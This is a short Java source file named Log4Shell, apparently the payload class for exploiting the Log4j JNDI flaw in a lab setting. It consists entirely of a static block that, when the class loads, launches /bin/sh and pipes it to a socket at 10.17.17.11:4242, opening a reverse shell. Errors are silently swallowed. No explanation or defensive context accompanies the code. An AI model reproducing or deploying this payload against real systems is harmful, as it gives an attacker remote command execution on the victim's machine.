import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Log4Shell {
    static {
        String host = "10.17.17.11";
        int port = 4242;
        String cmd = "/bin/sh";
        try {
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0)
                    so.write(pi.read());
                while (pe.available() > 0)
                    so.write(pe.read());
                while (si.available() > 0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {
                }
            }
            p.destroy();
            s.close();
        } catch (Exception e) {
        }
    }
}
